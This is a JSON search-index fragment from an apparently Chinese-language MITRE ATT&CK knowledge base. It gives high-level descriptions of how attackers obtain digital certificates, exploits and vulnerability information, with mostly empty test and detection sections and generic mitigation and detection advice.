https://attack.mitre.org/techniques/T1588/004/","title":"T1588-004-\u83b7\u53d6\u80fd\u529b-\u6570\u5b57\u8bc1\u4e66"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#t1588-004-","text":"","title":"T1588-004-\u83b7\u53d6\u80fd\u529b-\u6570\u5b57\u8bc1\u4e66"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u548c\u7a83\u53d6SSL/TLS\u8bc1\u4e66\uff0c\u4ee5\u4fbf\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u3002SSL/TLS\u8bc1\u4e66\u662f\u4e3a\u4e86\u704c\u8f93\u4fe1\u4efb\u3002\u5b83\u4eec\u5305\u62ec\u5173\u4e8e\u5bc6\u94a5\u7684\u4fe1\u606f\uff0c\u5173\u4e8e\u5176\u6240\u6709\u8005\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5b9e\u4f53\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u8be5\u5b9e\u4f53\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u8bc1\u4e66\u7684\u5185\u5bb9\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u7b7e\u540d\u662f\u6709\u6548\u7684\uff0c\u5e76\u4e14\u68c0\u67e5\u8bc1\u4e66\u7684\u4eba\u4fe1\u4efb\u7b7e\u540d\u8005\uff0c\u90a3\u4e48\u4ed6\u4eec\u5c31\u77e5\u9053\u53ef\u4ee5\u4f7f\u7528\u8be5\u94a5\u5319\u4e0e\u8bc1\u4e66\u6240\u6709\u8005\u8fdb\u884c\u901a\u4fe1\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u6216\u7a83\u53d6SSL/TLS\u8bc1\u4e66\uff0c\u4ee5\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5982\u52a0\u5bc6C2\u6d41\u91cf\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u534f\u8bae\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u6cd5\uff09\uff0c\u751a\u81f3\u542f\u7528\u4e2d\u95f4\u4eba\uff0c\u5982\u679c\u8bc1\u4e66\u88ab\u4fe1\u4efb\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6dfb\u52a0\u5230\u4fe1\u4efb\u6839\uff08\u5373\u5b89\u88c5\u6839\u8bc1\u4e66\uff09\u3002\u6570\u5b57\u8bc1\u4e66\u7684\u8d2d\u4e70\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u5e4c\u5b50\u7ec4\u7ec7\uff0c\u6216\u4f7f\u7528\u4ece\u4ee5\u524d\u88ab\u653b\u7834\u7684\u5b9e\u4f53\u4e2d\u7a83\u53d6\u7684\u4fe1\u606f\uff0c\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u4ee5\u8be5\u5b9e\u4f53\u7684\u8eab\u4efd\u5411\u8bc1\u4e66\u63d0\u4f9b\u8005\u9a8c\u8bc1\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece\u88ab\u653b\u51fb\u7684\u7b2c\u4e09\u65b9\u90a3\u91cc\u7a83\u53d6\u8bc1\u4e66\u6750\u6599\uff0c\u5305\u62ec\u4ece\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u90a3\u91cc\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u518c\u6216\u52ab\u6301\u4ed6\u4eec\u4ee5\u540e\u8981\u8d2d\u4e70SSL/TLS\u8bc1\u4e66\u7684\u57df\u540d\u3002 \u6709\u4e00\u4e9b\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u5141\u8bb8\u653b\u51fb\u8005\u514d\u8d39\u83b7\u5f97SSL/TLS\u8bc1\u4e66\uff0c\u5982\u57df\u540d\u9a8c\u8bc1\u8bc1\u4e66\u3002 \u83b7\u5f97\u6570\u5b57\u8bc1\u4e66\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5176\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u5b89\u88c5\u8be5\u8bc1\u4e66\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_8","text":"\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u65b0\u9881\u53d1\u7684\u8bc1\u4e66\u6216\u4e92\u8054\u7f51\u4e0a\u7684\u7f51\u7ad9\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u901a\u8fc7\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u6765\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u653b\u51fb\u8005\u5de5\u5177\u7684\u4e00\u4e9b\u670d\u52a1\u5668\u7aef\u7ec4\u4ef6\u53ef\u80fd\u4e3aSSL/TLS\u8bc1\u4e66\u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u503c\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u5982\u7f51\u7edc\u534f\u8bae\u3001\u975e\u5bf9\u79f0\u52a0\u5bc6\u6216\u5b89\u88c5\u6839\u8bc1\u4e66\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_9","text":"MITRE-ATT&CK-T1588-004 https://attack.mitre.org/techniques/T1588/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","text":"T1588-005-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u4e86\u4e00\u4e2a\u9519\u8bef\u6216\u6f0f\u6d1e\uff0c\u4ee5\u4f7f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u4e0e\u5176\u5f00\u53d1\u81ea\u5df1\u7684\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4ece\u7f51\u4e0a\u627e\u5230/\u4fee\u6539\u6f0f\u6d1e\uff0c\u6216\u4ece\u6f0f\u6d1e\u4f9b\u5e94\u5546\u90a3\u91cc\u8d2d\u4e70\u6f0f\u6d1e\u3002 \u9664\u4e86\u4ece\u4e92\u8054\u7f51\u4e0a\u4e0b\u8f7d\u514d\u8d39\u7684\u6f0f\u6d1e\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u6f0f\u6d1e\u3002\u7b2c\u4e09\u65b9\u5b9e\u4f53\u53ef\u4ee5\u5305\u62ec\u4e13\u95e8\u4ece\u4e8b\u6f0f\u6d1e\u5f00\u53d1\u7684\u6280\u672f\u516c\u53f8\u3001\u72af\u7f6a\u5e02\u573a\uff08\u5305\u62ec\u6f0f\u6d1e\u5de5\u5177\u5305\uff09\u6216\u4e2a\u4eba\u3002\u9664\u4e86\u8d2d\u4e70\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u548c\u91cd\u65b0\u5229\u7528\u6f0f\u6d1e\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d1\u63a7\u6f0f\u6d1e\u63d0\u4f9b\u8005\u7684\u8bba\u575b\uff0c\u4ee5\u4e86\u89e3\u73b0\u6709\u7684\u4ee5\u53ca\u65b0\u53d1\u73b0\u7684\u6f0f\u6d1e\u7684\u72b6\u6001\u3002\u5728\u53d1\u73b0\u6f0f\u6d1e\u548c\u516c\u5f00\u6f0f\u6d1e\u4e4b\u95f4\u901a\u5e38\u4f1a\u6709\u5ef6\u8fdf\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4ee5\u90a3\u4e9b\u5df2\u77e5\u8fdb\u884c\u6f0f\u6d1e\u7814\u7a76\u548c\u5f00\u53d1\u7684\u7cfb\u7edf\u4e3a\u76ee\u6807\uff0c\u4ee5\u4fbf\u83b7\u5f97\u77e5\u8bc6\uff0c\u5728\u540e\u7eed\u884c\u52a8\u4e2d\u4f7f\u7528\u3002 \u653b\u51fb\u53ef\u8005\u80fd\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5404\u4e2a\u9636\u6bb5\u4f7f\u7528\u6f0f\u6d1e\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u4e0e\u4f7f\u7528\u6f0f\u6d1e\u6709\u5173\u7684\u884c\u4e3a\u4e0a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1588-005 https://attack.mitre.org/techniques/T1588/005/","title":"T1588-005-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#t1588-005-","text":"","title":"T1588-005-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u4e86\u4e00\u4e2a\u9519\u8bef\u6216\u6f0f\u6d1e\uff0c\u4ee5\u4f7f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u4e0e\u5176\u5f00\u53d1\u81ea\u5df1\u7684\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4ece\u7f51\u4e0a\u627e\u5230/\u4fee\u6539\u6f0f\u6d1e\uff0c\u6216\u4ece\u6f0f\u6d1e\u4f9b\u5e94\u5546\u90a3\u91cc\u8d2d\u4e70\u6f0f\u6d1e\u3002 \u9664\u4e86\u4ece\u4e92\u8054\u7f51\u4e0a\u4e0b\u8f7d\u514d\u8d39\u7684\u6f0f\u6d1e\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u6f0f\u6d1e\u3002\u7b2c\u4e09\u65b9\u5b9e\u4f53\u53ef\u4ee5\u5305\u62ec\u4e13\u95e8\u4ece\u4e8b\u6f0f\u6d1e\u5f00\u53d1\u7684\u6280\u672f\u516c\u53f8\u3001\u72af\u7f6a\u5e02\u573a\uff08\u5305\u62ec\u6f0f\u6d1e\u5de5\u5177\u5305\uff09\u6216\u4e2a\u4eba\u3002\u9664\u4e86\u8d2d\u4e70\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u548c\u91cd\u65b0\u5229\u7528\u6f0f\u6d1e\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d1\u63a7\u6f0f\u6d1e\u63d0\u4f9b\u8005\u7684\u8bba\u575b\uff0c\u4ee5\u4e86\u89e3\u73b0\u6709\u7684\u4ee5\u53ca\u65b0\u53d1\u73b0\u7684\u6f0f\u6d1e\u7684\u72b6\u6001\u3002\u5728\u53d1\u73b0\u6f0f\u6d1e\u548c\u516c\u5f00\u6f0f\u6d1e\u4e4b\u95f4\u901a\u5e38\u4f1a\u6709\u5ef6\u8fdf\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4ee5\u90a3\u4e9b\u5df2\u77e5\u8fdb\u884c\u6f0f\u6d1e\u7814\u7a76\u548c\u5f00\u53d1\u7684\u7cfb\u7edf\u4e3a\u76ee\u6807\uff0c\u4ee5\u4fbf\u83b7\u5f97\u77e5\u8bc6\uff0c\u5728\u540e\u7eed\u884c\u52a8\u4e2d\u4f7f\u7528\u3002 \u653b\u51fb\u53ef\u8005\u80fd\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5404\u4e2a\u9636\u6bb5\u4f7f\u7528\u6f0f\u6d1e\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u4e0e\u4f7f\u7528\u6f0f\u6d1e\u6709\u5173\u7684\u884c\u4e3a\u4e0a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_9","text":"MITRE-ATT&CK-T1588-005 https://attack.mitre.org/techniques/T1588/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/","text":"T1588-006-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u5f97\u6709\u5173\u6f0f\u6d1e\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u7684\u65b9\u6cd5\u65f6\u4f7f\u7528\u3002\u6f0f\u6d1e\u662f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u4e2d\u7684\u4e00\u4e2a\u5f31\u70b9\uff0c\u5b83\u6709\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u5bfc\u81f4\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5f00\u653e\u7684\u6f0f\u6d1e\u6570\u636e\u5e93\u6216\u8fdb\u5165\u5c01\u95ed\u7684\u6f0f\u6d1e\u6570\u636e\u5e93\u6765\u5bfb\u627e\u6f0f\u6d1e\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u76d1\u89c6\u6f0f\u6d1e\u62ab\u9732\u6570\u636e\u5e93\uff0c\u4ee5\u4e86\u89e3\u73b0\u6709\u7684\u4ee5\u53ca\u65b0\u53d1\u73b0\u7684\u6f0f\u6d1e\u7684\u72b6\u51b5\u3002\u5728\u53d1\u73b0\u6f0f\u6d1e\u548c\u516c\u5f00\u6f0f\u6d1e\u4e4b\u95f4\u901a\u5e38\u4f1a\u6709\u5ef6\u8fdf\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u628a\u90a3\u4e9b\u5df2\u77e5\u8fdb\u884c\u6f0f\u6d1e\u7814\u7a76\u7684\u7cfb\u7edf\u4f5c\u4e3a\u76ee\u6807\uff08\u5305\u62ec\u5546\u4e1a\u4f9b\u5e94\u5546\uff09\u3002\u5bf9\u6f0f\u6d1e\u7684\u4e86\u89e3\u53ef\u80fd\u4f1a\u4f7f\u653b\u51fb\u8005\u5bfb\u627e\u73b0\u6709\u7684\u6f0f\u6d1e\u6216\u8bd5\u56fe\u81ea\u5df1\u6316\u6398\u51fa\u4e00\u4e2a\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4fa7\u91cd\u4e8e\u4e0e\u6f0f\u6d1e\u5229\u7528\u7684\u6f5c\u5728\u4f7f\u7528\u76f8\u5173\u7684\u884c\u4e3a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u636e\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\uff0c\u4ee5\u53ca\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u5f00\u53d1\uff09 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1588-006 